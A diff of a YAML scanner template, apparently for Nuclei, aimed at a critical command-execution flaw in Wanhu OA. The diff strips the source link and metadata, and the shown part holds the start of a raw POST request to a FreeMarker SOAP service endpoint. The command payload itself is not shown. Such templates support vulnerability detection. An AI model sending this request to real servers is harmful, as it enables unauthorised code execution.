@@ -3,17 +3,11 @@ info:
   name: 万户 OA 命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hwkmt1hh22r3kkts'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hwkmt1hh22r3kkts
-    fofa: 暂无
 http:
 - raw:
   - 'POST /defaultroot/services/./././freemarkeService HTTP/1.1
-
-
 
 
     <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
